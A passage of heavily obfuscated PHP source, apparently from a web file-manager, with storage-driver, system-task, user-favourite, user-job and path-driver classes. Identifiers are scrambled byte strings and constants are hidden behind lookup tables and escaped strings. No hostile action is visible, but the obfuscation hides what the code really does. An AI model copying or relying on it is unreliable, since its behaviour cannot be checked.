0)); } } } return $òÑÊÜ±™; } public function updateBackup($ÆÉ¬á’Á, $Ó›«ö¸Æ) { $ğÖ’“Ñ =& $_SERVER[ĞÆÏ¡Îª]; if (!$Ó›«ö¸Æ) { return; } $×¢â¸ó = Model($ğÖ’“Ñ[744])->config(); if ($×¢â¸ó[$ğÖ’“Ñ[1617]] != $ğÖ’“Ñ[88] || $×¢â¸ó[$ğÖ’“Ñ[747]] != $Ó›«ö¸Æ) { return; } $Æ®ûÀ¹— = Model($ğÖ’“Ñ[765])->get($ğÖ’“Ñ[775]); $Æ®ûÀ¹— = json_decode($Æ®ûÀ¹—, !0); if (!$Æ®ûÀ¹—) { return; } $Æ®ûÀ¹—[$ğÖ’“Ñ[747]] = $ÆÉ¬á’Á; Model($ğÖ’“Ñ[765])->set(array($ğÖ’“Ñ[775] => $Æ®ûÀ¹—)); } public function checkPwd($ŠËÑÅ¡–, &$Ş•ñ¹î²) { $ï¢¡¯µç =& $_SERVER[ĞÆÏ¡Îª]; if (empty($Ş•ñ¹î²[$ï¢¡¯µç[6]])) { return; } $ğ™âÓĞ€ = json_decode($Ş•ñ¹î²[$ï¢¡¯µç[6]], !0); $×ã¨¤Š§ = $ï¢¡¯µç[12]; $Ê¨ã™¦¹ = array($ï¢¡¯µç[2134], $ï¢¡¯µç[2135], $ï¢¡¯µç[880]); foreach ($Ê¨ã™¦¹ as $×È­Ó°) { if (isset($ğ™âÓĞ€[$×È­Ó°])) { $×ã¨¤Š§ = $×È­Ó°; break; } } if (!$×ã¨¤Š§) { return; } $¢µÁå€ˆ = $this->getConfig($ŠËÑÅ¡–); $Êï±‘¼ = $¢µÁå€ˆ[$×ã¨¤Š§]; $ÙÙ÷»ãó = $ğ™âÓĞ€[$×ã¨¤Š§]; if ($ÙÙ÷»ãó == str_repeat($ï¢¡¯µç[188], strlen($Êï±‘¼))) { $ğ™âÓĞ€[$×ã¨¤Š§] = $Êï±‘¼; $Ş•ñ¹î²[$ï¢¡¯µç[6]] = json_encode($ğ™âÓĞ€); } else { if ($ÙÙ÷»ãó != $Êï±‘¼) { $Ş•ñ¹î²[$ï¢¡¯µç[2133]] = $ï¢¡¯µç[88]; } } } public function checkConfig(&$Ó¹œôâş, $Í©à‚Š¹ = false) { $„ƒéû“ =& $_SERVER[ĞÆÏ¡Îª]; $æ“Âİ–‹ = strtolower($Ó¹œôâş[$„ƒéû“[95]]); $¤Ğ«¼‹¿ = json_decode($Ó¹œôâş[$„ƒéû“[6]], !0); foreach ($¤Ğ«¼‹¿ as $ì¦µ½ÒÒ => $ñ–â«ãæ) { $¤Ğ«¼‹¿[$ì¦µ½ÒÒ] = trim($ñ–â«ãæ); } $¤Ğ«¼‹¿[$„ƒéû“[2136]] = rand_string(6); $‘á­ÒÉ = $GLOBALS[$„ƒéû“[6]][$„ƒéû“[89]][$„ƒéû“[821]]; $¥‘å¬İÈ = isset($‘á­ÒÉ[$æ“Âİ–‹]) ? $‘á­ÒÉ[$æ“Âİ–‹] : ucfirst($æ“Âİ–‹); $¬óÊ³‰Ú = $„ƒéû“[74] . $¥‘å¬İÈ; if (!$¥‘å¬İÈ || !class_exists($¬óÊ³‰Ú)) { if ($Í©à‚Š¹) { return LNG($„ƒéû“[2137]); } write_log(array($„ƒéû“[2138], $Ó¹œôâş, get_caller_info()), $„ƒéû“[2139]); show_json(LNG($„ƒéû“[2137]), !1, $Ó¹œôâş); } $îÃÂÄÛ = new $¬óÊ³‰Ú($¤Ğ«¼‹¿); if (in_array($æ“Âİ–‹, $îÃÂÄÛ->objectDriver)) { if (!$îÃÂÄÛ->isBucketCors() && !$îÃÂÄÛ->setBucketCors()) { $‹¨Õ“´Ÿ = LNG($„ƒéû“[2140]); $‹¨Õ“´Ÿ .= $„ƒéû“[2141] . LNG($„ƒéû“[2142]); if ($Í©à‚Š¹) { return $‹¨Õ“´Ÿ; } show_json($‹¨Õ“´Ÿ, !1); } } $æø®¸Ü† = rtrim($¤Ğ«¼‹¿[$„ƒéû“[1172]], $„ƒéû“[8]) . $„ƒéû“[8]; $ı’éË‚Ã = $îÃÂÄÛ->getPath($æø®¸Ü† . $„ƒéû“[1234]); if (!$îÃÂÄÛ->mkfile($ı’éË‚Ã)) { if ($Í©à‚Š¹) { return LNG($„ƒéû“[2140]); } show_json(LNG($„ƒéû“[2140]), !1); } $¤Ğ«¼‹¿[$„ƒéû“[1172]] = $æø®¸Ü†; $Ó¹œôâş[$„ƒéû“[6]] = json_encode($¤Ğ«¼‹¿); $Ó¹œôâş[$„ƒéû“[95]] = $¥‘å¬İÈ; return !0; } public function driverListSystem() { $›À Ì®€ =& $_SERVER[ĞÆÏ¡Îª]; $ü¿º›‰« = parent::listData(); $øßİ´ªø = array(); foreach ($ü¿º›‰« as $„è«—×¦) { unset($„è«—×¦[$›À Ì®€[200]], $„è«—×¦[$›À Ì®€[85]]); $„è«—×¦[$›À Ì®€[6]] = json_decode($„è«—×¦[$›À Ì®€[6]], !0); $øßİ´ªø[] = $„è«—×¦; } return $øßİ´ªø; } public function defaultDriver() { $˜æ«ê„· =& $_SERVER[ĞÆÏ¡Îª]; $¡Ä½ìÈ = parent::listData(); $·öˆïƒ× = array_filter_by_field($¡Ä½ìÈ, $˜æ«ê„·[37], 1); $·öˆïƒ× = $·öˆïƒ×[0]; if ($·öˆïƒ×) { $·öˆïƒ×[$˜æ«ê„·[6]] = json_decode($·öˆïƒ×[$˜æ«ê„·[6]], !0); } return $·öˆïƒ×; } public function driverInfo($Òİå™Ç¿) { $äª£³áâ =& $_SERVER[ĞÆÏ¡Îª]; $Ş¢­íØî = array_to_keyvalue(parent::listData(), $äª£³áâ[407]); if (!isset($Ş¢­íØî[$Òİå™Ç¿])) { return !1; } $ÒĞÚàşÃ = $Ş¢­íØî[$Òİå™Ç¿]; $ÒĞÚàşÃ[$äª£³áâ[6]] = json_decode($ÒĞÚàşÃ[$äª£³áâ[6]], !0); return $ÒĞÚàşÃ; } public function remove($Ü‰ñî’½) { $this->removeShareItems($Ü‰ñî’½); return parent::remove($Ü‰ñî’½); } public function removeWithFile($¥ì‹¨°, $¡Ü®²¾) { $’Äİ—Šå =& $_SERVER[ĞÆÏ¡Îª]; $ùñÒ…ğ = array($’Äİ—Šå[812] => $¥ì‹¨°); $Ö¾°ê›° = Model($’Äİ—Šå[480])->where($ùñÒ…ğ)->count(); $ëÙ¤¼Œ = Model($’Äİ—Šå[480])->where($ùñÒ…ğ)->sum($’Äİ—Šå[76]); $ãí¢†ô = $¡Ü®²¾ . $’Äİ—Šå[2143] . $¥ì‹¨°; $ËÍéô´„ = LNG($¡Ü®²¾ == $’Äİ—Šå[566] ? $’Äİ—Šå[2144] : $’Äİ—Šå[2145]); $•¨ù»Äˆ = new TaskFileTransfer($ãí¢†ô, $’Äİ—Šå[2139], $Ö¾°ê›°, $ËÍéô´„ . "\x28{$¥ì‹¨°}\51"); $•¨ù»Äˆ->task[$’Äİ—Šå[758]] = (double) $ëÙ¤¼Œ; $¬ÑÎ¶à = KodIO::defaultDriver(); $èéöşËÁ = $¬ÑÎ¶à[$’Äİ—Šå[407]]; $ Œ…ü¯¼ = "\x7b\151\157\72{$èéöşËÁ}\x7d\57"; $Êä³„­ = !0; $›‹Ù¿ÃÓ = array(); $³Èó÷İ  = Model($’Äİ—Šå[199])->where($ùñÒ…ğ)->field($’Äİ—Šå[2146])->select(); foreach ($³Èó÷İ  as $ê÷ÙÆ€Ä) { $×·áÑ¬’ = $ê÷ÙÆ€Ä[$’Äİ—Šå[84]]; $¥ªµæ• = $ Œ…ü¯¼ . str_replace("\173\x69\157\72{$¥ì‹¨°}\x7d\x2f", $’Äİ—Šå[12], $×·áÑ¬’); if (!IO::exist($×·áÑ¬’)) { $›‹Ù¿ÃÓ[] = $ê÷ÙÆ€Ä[$’Äİ—Šå[477]]; $•¨ù»Äˆ->updateFileEnd($ê÷ÙÆ€Ä[$’Äİ—Šå[32]], $ê÷ÙÆ€Ä[$’Äİ—Šå[76]]); continue; } if (IO::exist($¥ªµæ•)) { $•¨ù»Äˆ->updateFileEnd($ê÷ÙÆ€Ä[$’Äİ—Šå[32]], $ê÷ÙÆ€Ä[$’Äİ—Šå[76]]); continue; } if (!IO::move($×·áÑ¬’, get_path_father($¥ªµæ•))) { $Êä³„­ = !1; break; } $ùñÒ…ğ = array($’Äİ—Šå[477] => $ê÷ÙÆ€Ä[$’Äİ—Šå[477]]); $ù¤Ãàí = array($’Äİ—Šå[812] => $èéöşËÁ, $’Äİ—Šå[84] => $¥ªµæ•); Model($’Äİ—Šå[199])->where($ùñÒ…ğ)->save($ù¤Ãàí); } $this->removeByFileID($›‹Ù¿ÃÓ); if (!$Êä³„­) { $•¨ù»Äˆ->stop($ãí¢†ô); return !1; } $•¨ù»Äˆ->end(); if ($¡Ü®²¾ == $’Äİ—Šå[1788]) { $this->remove($¥ì‹¨°); } } public function progress($€…Ü«Å, $äÙ²ûÕŒ) { return Task::get($äÙ²ûÕŒ . $_SERVER[ĞÆÏ¡Îª][2143] . $€…Ü«Å); } private function removeByFileID($ö…ó“ûÇ = array()) { $—ù¯¾Ñ =& $_SERVER[ĞÆÏ¡Îª]; if (empty($ö…ó“ûÇ)) { return; } $ëÅêÆÒ = array($—ù¯¾Ñ[477] => array($—ù¯¾Ñ[7], $ö…ó“ûÇ)); $ğÜäò†Ë = Model($—ù¯¾Ñ[1318])->where($ëÅêÆÒ)->field($—ù¯¾Ñ[411])->select(); if (!$ğÜäò†Ë) { return; } $ğÜäò†Ë = array_to_keyvalue($ğÜäò†Ë, $—ù¯¾Ñ[12], $—ù¯¾Ñ[411]); foreach ($ğÜäò†Ë as $‹¹­™áÁ) { Model($—ù¯¾Ñ[425])->removeNow($‹¹­™áÁ, !1); } } private function removeShareItems($ÁáÊöè±) { $ŸÔ‹ÁÄÀ =& $_SERVER[ĞÆÏ¡Îª]; $Î¢™Ñà¤ = "\173\151\157\72{$ÁáÊöè±}\x7d\x2f"; $Ãşêäî† = array($ŸÔ‹ÁÄÀ[411] => 0, $ŸÔ‹ÁÄÀ[1167] => array($ŸÔ‹ÁÄÀ[391], "{$Î¢™Ñà¤}\45")); $ëïÒ‡À€ = Model($ŸÔ‹ÁÄÀ[1799])->where($Ãşêäî†)->field($ŸÔ‹ÁÄÀ[498])->select(); if (empty($ëïÒ‡À€)) { return; } $¦ç¸Âñ¹ = array_to_keyvalue($ëïÒ‡À€, $ŸÔ‹ÁÄÀ[12], $ŸÔ‹ÁÄÀ[498]); Model($ŸÔ‹ÁÄÀ[610])->remove($¦ç¸Âñ¹); } } goto E¦ÆÎ¹ˆùÁ; EâğÉÍ²«È: class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\155\56\164\x61\163\x6b\x4c\151\x73\x74"; public $field = array("\156\x61\x6d\x65", "\164\171\160\145", "\145\166\x65\156\x74", "\164\151\x6d\x65", "\x64\x65\x73\143", "\163\x79\163\x74\x65\x6d", "\x65\156\141\142\154\x65", "\154\x61\x73\164\122\x75\x6e", "\x73\x6f\162\x74"); public function listData($ĞŞÒ”…Ú = false, $ßõ£Ÿ”œ = "\163\157\162\x74", $­†•–†· = false) { return parent::listData($ĞŞÒ”…Ú, $ßõ£Ÿ”œ, $­†•–†·); } public function add($ö¡‚¤×ï) { $—¥¬âË¦ =& $_SERVER[ĞÆÏ¡Îª]; $ÂËÇ‘½â = $this->findByName($ö¡‚¤×ï[$—¥¬âË¦[32]]); if ($ÂËÇ‘½â) { return !1; } $ö¡‚¤×ï[$—¥¬âË¦[1607]] = 0; $ö¡‚¤×ï[$—¥¬âË¦[1843]] = $this->getSort(); return parent::insert($ö¡‚¤×ï); } private function getSort() { $áË«¬›À =& $_SERVER[ĞÆÏ¡Îª]; $¦ÚÄñî = parent::listData(); $Öéàåº = array_to_keyvalue($¦ÚÄñî, $áË«¬›À[12], $áË«¬›À[1843]); return empty($Öéàåº) ? 0 : max($Öéàåº) + 1; } public function update($ùœŞâ, $Ëå‘Ï±Ê) { $Üá‚ƒôÂ =& $_SERVER[ĞÆÏ¡Îª]; $ãä—ÏË = $this->listData($ùœŞâ); $òŞ”››Ø = $this->findByName($Ëå‘Ï±Ê[$Üá‚ƒôÂ[32]]); if (!$ãä—ÏË || $òŞ”››Ø && $òŞ”››Ø[$Üá‚ƒôÂ[407]] != $ãä—ÏË[$Üá‚ƒôÂ[407]]) { return !1; } return parent::update($ùœŞâ, $Ëå‘Ï±Ê); } public function remove($îØ…¬, $·ïˆåëÍ = false) { $¯ŞŸÏÍÆ =& $_SERVER[ĞÆÏ¡Îª]; $‡ñ·óù— = $this->listData($îØ…¬); if (!$‡ñ·óù—) { return; } if (!$·ïˆåëÍ && $‡ñ·óù—[$¯ŞŸÏÍÆ[1267]] == $¯ŞŸÏÍÆ[88]) { return !1; } return parent::remove($îØ…¬); } public function enable($ÄÇí„ß², $Ò¢¢ƒ·) { return $this->update($ÄÇí„ß², array($_SERVER[ĞÆÏ¡Îª][2246] => $Ò¢¢ƒ·)); } public function run($šÉÉó©Î) { return $this->update($šÉÉó©Î, array($_SERVER[ĞÆÏ¡Îª][2258] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\137\146\x61\166"; protected function cacheFunctionAlias($ğœˆ¸Üå) { $™×ºÎ¶Ê =& $_SERVER[ĞÆÏ¡Îª]; return array($™×ºÎ¶Ê[1930] => array(USER_ID, $™×ºÎ¶Ê[2259])); } protected function listData() { $İæÈÏÈÕ =& $_SERVER[ĞÆÏ¡Îª]; $ìºë”¢Æ = array($İæÈÏÈÕ[1638] => USER_ID, $İæÈÏÈÕ[493] => 0); $äì’ëœÆ = $İæÈÏÈÕ[2260]; $ ¤Î¸ÅÆ = $this->field($äì’ëœÆ)->where($ìºë”¢Æ)->order($İæÈÏÈÕ[2261])->select(); return $ ¤Î¸ÅÆ ? $ ¤Î¸ÅÆ : array(); } protected function resetCache() { } protected function listView() { $åÌ±éÒ™ =& $_SERVER[ĞÆÏ¡Îª]; $Ç’ü´½ = $this->listData(); $Ššæ¯ª” = array_filter_by_field($Ç’ü´½, $åÌ±éÒ™[33], $åÌ±éÒ™[425]); $Øñ›¦‘Å = array_to_keyvalue($Ššæ¯ª”, $åÌ±éÒ™[12], $åÌ±éÒ™[84]); if (!$Øñ›¦‘Å) { return $Ç’ü´½; } $ÎŠ÷èµ­ = 2000; $°ûùü¹¯ = array($åÌ±éÒ™[426] => array($åÌ±éÒ™[427], $Øñ›¦‘Å)); $¼Â„ËÀ = Model($åÌ±éÒ™[820])->listSource($°ûùü¹¯, $ÎŠ÷èµ­); $¼Â„ËÀ = array_merge($¼Â„ËÀ[$åÌ±éÒ™[83]], $¼Â„ËÀ[$åÌ±éÒ™[82]]); $¼Â„ËÀ = array_to_keyvalue($¼Â„ËÀ, $åÌ±éÒ™[411]); foreach ($Ç’ü´½ as $ƒ¦Îö˜ => $¥‰’Ú) { $ÄÆÔÍË = $¼Â„ËÀ[$¥‰’Ú[$åÌ±éÒ™[84]]]; $ÄÆÔÍË = $ÄÆÔÍË ? $ÄÆÔÍË : array(); $Ç’ü´½[$ƒ¦Îö˜] = array_merge($ÄÆÔÍË, $¥‰’Ú); } return $Ç’ü´½; } protected function addFav($ÊåŞ¡Ôã, $»‚ˆÍ›« = '', $¬½„µŞÙ = "\x73\x6f\165\x72\x63\x65") { $Ûñ·ä–î =& $_SERVER[ĞÆÏ¡Îª]; $ÒöÚ»¶Ô = array($Ûñ·ä–î[1638] => USER_ID, $Ûñ·ä–î[493] => 0, $Ûñ·ä–î[431] => $¬½„µŞÙ, $Ûñ·ä–î[430] => $ÊåŞ¡Ôã); if ($this->where($ÒöÚ»¶Ô)->find()) { return !1; } $ÒöÚ»¶Ô = array($Ûñ·ä–î[1638] => USER_ID, $Ûñ·ä–î[493] => 0); $ÑÇ€Áš = $this->where($ÒöÚ»¶Ô)->max($Ûñ·ä–î[1843]); if (!$ÑÇ€Áš) { $ÑÇ€Áš = 0; } if (!$»‚ˆÍ›« && $¬½„µŞÙ == $Ûñ·ä–î[425]) { $ëş²äñ = Model($Ûñ·ä–î[1318])->where(array($Ûñ·ä–î[426] => $ÊåŞ¡Ôã))->find(); if (!$ëş²äñ) { return !1; } $»‚ˆÍ›« = $ëş²äñ[$Ûñ·ä–î[32]]; } $»‚ˆÍ›« = $this->getAutoName($»‚ˆÍ›«); $ÚğÕ‡ü¹ = array($Ûñ·ä–î[1638] => USER_ID, $Ûñ·ä–î[493] => 0, $Ûñ·ä–î[429] => $»‚ˆÍ›«, $Ûñ·ä–î[430] => $ÊåŞ¡Ôã, $Ûñ·ä–î[431] => $¬½„µŞÙ, $Ûñ·ä–î[1823] => $ÑÇ€Áš + 1); return $this->add($ÚğÕ‡ü¹); } protected function remove($ÛŠ§Û“ı) { $ §ÂÏşŠ =& $_SERVER[ĞÆÏ¡Îª]; $È™âà˜ = array($ §ÂÏşŠ[1638] => USER_ID, $ §ÂÏşŠ[428] => $ÛŠ§Û“ı); return $this->where($È™âà˜)->delete(); } protected function removeByName($§ÛûÎé) { $ãáİÒ¼ş =& $_SERVER[ĞÆÏ¡Îª]; $óÚÔ‹‰ = array($ãáİÒ¼ş[1638] => USER_ID, $ãáİÒ¼ş[429] => $§ÛûÎé, $ãáİÒ¼ş[493] => 0); return $this->where($óÚÔ‹‰)->delete(); } protected function rename($ƒŒİ¡÷î, $ÄÏåşÛ«) { $ºƒÖÛ÷ =& $_SERVER[ĞÆÏ¡Îª]; if ($ƒŒİ¡÷î == $ÄÏåşÛ«) { return !1; } $µµ—Ş¾ö = $this->getAutoName($ÄÏåşÛ«); if ($ÄÏåşÛ« != $µµ—Ş¾ö) { return !1; } $¡·ÂáÙÓ = array($ºƒÖÛ÷[1638] => USER_ID, $ºƒÖÛ÷[493] => 0, $ºƒÖÛ÷[32] => $ƒŒİ¡÷î); return $this->where($¡·ÂáÙÓ)->save(array($ºƒÖÛ÷[32] => $ÄÏåşÛ«)); } protected function resetSort($€‰ĞÓæ‚) { $ÎéË¼ù¾ =& $_SERVER[ĞÆÏ¡Îª]; $€‰ĞÓæ‚ = is_array($€‰ĞÓæ‚) ? $€‰ĞÓæ‚ : array(); $ë¯ÆÀ­ş = array($ÎéË¼ù¾[1638] => USER_ID); for ($·ÂêÂĞš = 0; $·ÂêÂĞš < count($€‰ĞÓæ‚); $·ÂêÂĞš++) { $ë¯ÆÀ­ş[$ÎéË¼ù¾[428]] = $€‰ĞÓæ‚[$·ÂêÂĞš]; $this->where($ë¯ÆÀ­ş)->save(array($ÎéË¼ù¾[1823] => $·ÂêÂĞš + 1)); } return !0; } protected function moveTop($ü–¨ˆ) { $³¿öÛìó =& $_SERVER[ĞÆÏ¡Îª]; $×èÒ–ù” = array($³¿öÛìó[1638] => USER_ID, $³¿öÛìó[493] => 0); $øÂæ¬±³ = $this->where($×èÒ–ù”)->where(array($³¿öÛìó[32] => $ü–¨ˆ))->find(); if (!$øÂæ¬±³) { return; } $°€’ÑÜº = $this->field($³¿öÛìó[407])->where($×èÒ–ù”)->order($³¿öÛìó[2261])->select(); $°€’ÑÜº = array_to_keyvalue($°€’ÑÜº, $³¿öÛìó[12], $³¿öÛìó[407]); $ ñêÚ¸“ = $°€’ÑÜº; $°€’ÑÜº = array_remove_value($°€’ÑÜº, $øÂæ¬±³[$³¿öÛìó[407]]); array_unshift($°€’ÑÜº, $øÂæ¬±³[$³¿öÛìó[407]]); return $this->resetSort($°€’ÑÜº); } protected function moveBottom($“Ñç³ô) { $¾‚—¹ñÉ =& $_SERVER[ĞÆÏ¡Îª]; $–ü“òÓğ = array($¾‚—¹ñÉ[1638] => USER_ID, $¾‚—¹ñÉ[493] => 0); $¨Êôßœ = $this->where($–ü“òÓğ)->max($¾‚—¹ñÉ[1843]); $Îè¸á = array($¾‚—¹ñÉ[1843] => $¨Êôßœ + 1); return $this->where($–ü“òÓğ)->where(array($¾‚—¹ñÉ[32] => $“Ñç³ô))->save($Îè¸á); } private function getAutoName($Ãäê«Î¼) { $ï£İ³ù˜ =& $_SERVER[ĞÆÏ¡Îª]; $ù™®ã·¬ = array($ï£İ³ù˜[1638] => USER_ID, $ï£İ³ù˜[493] => 0); $ÊÍ—Ï‘ = $this->field($ï£İ³ù˜[32])->where($ù™®ã·¬)->select(); $ÊÍ—Ï‘ = array_to_keyvalue($ÊÍ—Ï‘, $ï£İ³ù˜[12], $ï£İ³ù˜[32]); if (!$ÊÍ—Ï‘ || !in_array($Ãäê«Î¼, $ÊÍ—Ï‘)) { return $Ãäê«Î¼; } for ($«Ô·ƒÀ = 0; $«Ô·ƒÀ < count($ÊÍ—Ï‘); $«Ô·ƒÀ++) { if (!in_array($Ãäê«Î¼ . "\x28{$«Ô·ƒÀ}\51", $ÊÍ—Ï‘)) { return $Ãäê«Î¼ . "\50{$«Ô·ƒÀ}\51"; } } return $Ãäê«Î¼ . "\x28{$«Ô·ƒÀ}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\155\x2e\x6a\x6f\142\x4c\x69\x73\x74"; public $field = array("\156\141\x6d\145", "\144\x65\163\x63", "\x73\157\x72\164"); const JOB_KEY = "\163\x65\154\x66\x4a\157\142\114\x69\x73\x74"; public function listData($©’Âª´° = false, $êı¥ÕØ = "\x73\157\x72\164", $ÚÛ¦àÃ = false) { return parent::listData($©’Âª´°, $êı¥ÕØ, $ÚÛ¦àÃ); } public function remove($¸ßè’¶±) { return parent::remove($¸ßè’¶±); } public function add($ê¬—Ä¾ì) { $ˆÀãÙ¨ =& $_SERVER[ĞÆÏ¡Îª]; if ($this->findByName($ê¬—Ä¾ì[$ˆÀãÙ¨[32]])) { return !1; } $ê¬—Ä¾ì[$ˆÀãÙ¨[1843]] = $this->getSort(); return parent::insert($ê¬—Ä¾ì); } private function getSort() { $Ó…°¨±á =& $_SERVER[ĞÆÏ¡Îª]; $ëÑÚî À = parent::listData(); $»†×â–¢ = array_to_keyvalue($ëÑÚî À, $Ó…°¨±á[12], $Ó…°¨±á[1843]); return empty($»†×â–¢) ? 0 : max($»†×â–¢) + 1; } public function update($Ï”¦¥×, $ÊÖÑ¼Å²) { $€£ü×¡† =& $_SERVER[ĞÆÏ¡Îª]; $éÕòòïš = parent::listData($Ï”¦¥×); $ï‚‚º¿Ë = $this->findByName($ÊÖÑ¼Å²[$€£ü×¡†[32]]); if (!$éÕòòïš || $ï‚‚º¿Ë && $ï‚‚º¿Ë[$€£ü×¡†[407]] != $éÕòòïš[$€£ü×¡†[407]]) { return !1; } return parent::update($Ï”¦¥×, $ÊÖÑ¼Å²); } public function setUserJob($åƒï›“ª, $Î²ìËİ­) { $å¬æÖÇÙ =& $_SERVER[ĞÆÏ¡Îª]; if (!is_array($Î²ìËİ­)) { $Î²ìËİ­ = array($Î²ìËİ­); } $…õÒó’ö = parent::listData(); $²ÒåŸ˜ = array_to_keyvalue($…õÒó’ö, $å¬æÖÇÙ[32]); $ì½ğé’ = $å¬æÖÇÙ[246]; foreach ($Î²ìËİ­ as $Ìı”©öÈ) { if ($²ÒåŸ˜[$Ìı”©öÈ]) { $ì½ğé’ .= $²ÒåŸ˜[$Ìı”©öÈ][$å¬æÖÇÙ[407]] . $å¬æÖÇÙ[50]; } else { $‚¾•ºŠÑ = $this->add($Ìı”©öÈ); $ì½ğé’ .= $‚¾•ºŠÑ . $å¬æÖÇÙ[50]; } } $ì½ğé’ = rtrim($ì½ğé’, $å¬æÖÇÙ[50]); Model($å¬æÖÇÙ[544])->metaSet($åƒï›“ª, self::JOB_KEY, $ì½ğé’); } public function getUserJob($ş¥Ì€öÄ) { $“üµ®´ = Model($_SERVER[ĞÆÏ¡Îª][544])->metaGet($ş¥Ì€öÄ); return $this->getUserJobInfo($“üµ®´[self::JOB_KEY]); } public function getUserJobInfo($Û°ô®£¦) { $•ÑĞôæë =& $_SERVER[ĞÆÏ¡Îª]; $¸½“şİ² = explode($•ÑĞôæë[50], $Û°ô®£¦); $Ïå¥Œ‹â = parent::listData(); $Ïå¥Œ‹â = array_remove_key($Ïå¥Œ‹â, $•ÑĞôæë[200]); $ôíï¾ËÓ = array(); foreach ($¸½“şİ² as $´…»¢è“) { if (isset($Ïå¥Œ‹â[$´…»¢è“])) { $ôíï¾ËÓ[] = $Ïå¥Œ‹â[$´…»¢è“]; } } return $ôíï¾ËÓ; } } goto b¾Ï¢¦»Ç; aË„ëàœ¦¼: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $†…ÄŒºî =& $_SERVER[ĞÆÏ¡Îª]; $this->objectDriver = array($†…ÄŒºî[60], $†…ÄŒºî[61], $†…ÄŒºî[62], $†…ÄŒºî[63], $†…ÄŒºî[64], $†…ÄŒºî[65], $†…ÄŒºî[66], $†…ÄŒºî[67], $†…ÄŒºî[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($¼‘ßÛ‹û) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($¼‘ßÛ‹û, $_SERVER[ĞÆÏ¡Îª][8]); } return $¼‘ßÛ‹û; } public function iconvApp($‘ŞÀ¼£Ñ) { return $‘ŞÀ¼£Ñ; } public function iconvSystem($é²œùÙ„) { return $é²œùÙ„; } public function iconvTo($»”áøÄ‡, $¹Ã¨ÅùÇ, $»ª±×°‹) { $‡¡ÉÎñà =& $_SERVER[ĞÆÏ¡Îª]; if (!$»”áøÄ‡ || !function_exists($‡¡ÉÎñà[69])) { return $»”áøÄ‡; } static $¢ƒó§ËÅ = array(); $ö¾¶Á›‚ = $¹Ã¨ÅùÇ . $‡¡ÉÎñà[70] . $»ª±×°‹ . $‡¡ÉÎñà[71] . $»”áøÄ‡; if (isset($¢ƒó§ËÅ[$ö¾¶Á›‚])) { return $¢ƒó§ËÅ[$ö¾¶Á›‚]; } if (function_exists($‡¡ÉÎñà[72])) { $î‚ù›Î¯ = @mb_convert_encoding($»”áøÄ‡, $»ª±×°‹, $¹Ã¨ÅùÇ); } else { $î‚ù›Î¯ = @iconv($¹Ã¨ÅùÇ, $»ª±×°‹, $»”áøÄ‡); } $î‚ù›Î¯ = $î‚ù›Î¯ ? $î‚ù›Î¯ : $»”áøÄ‡; if (strstr($î‚ù›Î¯, $‡¡ÉÎñà[73])) { $î‚ù›Î¯ = str_replace($‡¡ÉÎñà[73], $‡¡ÉÎñà[11], $î‚ù›Î¯); } $¢ƒó§ËÅ[$¹Ã¨ÅùÇ . $‡¡ÉÎñà[70] . $»ª±×°‹ . $‡¡ÉÎñà[71] . $»”áøÄ‡] = $î‚ù›Î¯; $¢ƒó§ËÅ[$»ª±×°‹ . $‡¡ÉÎñà[70] . $¹Ã¨ÅùÇ . $‡¡ÉÎñà[71] . $»”áøÄ‡] = $»”áøÄ‡; $¢ƒó§ËÅ[$»ª±×°‹ . $‡¡ÉÎñà[70] . $¹Ã¨ÅùÇ . $‡¡ÉÎñà[71] . $î‚ù›Î¯] = $»”áøÄ‡; $¢ƒó§ËÅ[$¹Ã¨ÅùÇ . $‡¡ÉÎñà[70] . $»ª±×°‹ . $‡¡ÉÎñà[71] . $î‚ù›Î¯] = $î‚ù›Î¯; return $î‚ù›Î¯; } public function getPathInner($”‘ê¯è) { $ËòÛÏ = IO::init($”‘ê¯è); return $ËòÛÏ->path; } public function getPathOuter($ş‚’×á) { $ ûúÄ–¯ =& $_SERVER[ĞÆÏ¡Îª]; $£øŞï¶’ = strlen(trim($this->pathBase, $ ûúÄ–¯[8])); $ş‚’×á = substr(trim($ş‚’×á, $ ûúÄ–¯[8]), $£øŞï¶’); return $this->pathDriver . $ ûúÄ–¯[8] . ltrim($ş‚’×á, $ ûúÄ–¯[8]); } public function isParentOf($Ì‡”ÓÜá, $áÇƒœ¢´) { $è­¹Ëˆğ =& $_SERVER[ĞÆÏ¡Îª]; $Ì‡”ÓÜá = rtrim(strtolower($Ì‡”ÓÜá), $è­¹Ëˆğ[8]) . $è­¹Ëˆğ[8]; $áÇƒœ¢´ = rtrim(strtolower($áÇƒœ¢´), $è­¹Ëˆğ[8]) . $è­¹Ëˆğ[8]; $ÉæÌ˜èó = strpos($áÇƒœ¢´, $Ì‡”ÓÜá) === 0; return $ÉæÌ˜èó; } public function getType() { $Ú¹èû¨ =& $_SERVER[ĞÆÏ¡Îª]; $«Å£•± = str_replace($Ú¹èû¨[74], $Ú¹èû¨[12], get_class($this)); return strtolower($«Å£•±); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($ş£ˆĞªä, $´è¨¹Î) { $û›ô—ïå =& $_SERVER[ĞÆÏ¡Îª]; $·öÁÕÎÉ = rtrim($ş£ˆĞªä, $û›ô—ïå[8]) . $û›ô—ïå[8] . $´è¨¹Î; $òÉ‹ÀÛ = $this->exist($·öÁÕÎÉ); return $òÉ‹ÀÛ ? $·öÁÕÎÉ : !1; } public function setModifyTime($Ô½–öà, $‰·µÑ¸ = '') { } public function renameObject($œì˜ºüÍ, $ßù¶˜®Û) { $Êë‡Ü¥ = $ßù¶˜®Û; $œì˜ºüÍ = $this->getPathOuter($œì˜ºüÍ); $ßù¶˜®Û = $this->pathFather($œì˜ºüÍ) . $ßù¶˜®Û; $á™î˜×È = IO::copy($œì˜ºüÍ, $this->pathFather($œì˜ºüÍ), REPEAT_RENAME_FOLDER, $Êë‡Ü¥); if ($á™î˜×È) { IO::remove($œì˜ºüÍ); } return $á™î˜×È ? $ßù¶˜®Û : !1; } public function tempFile($Ø¥¥ïáµ = '', $–Óö³­ = '') { if (!$Ø¥¥ïáµ) { $Ø¥¥ïáµ = rand_string(15); } 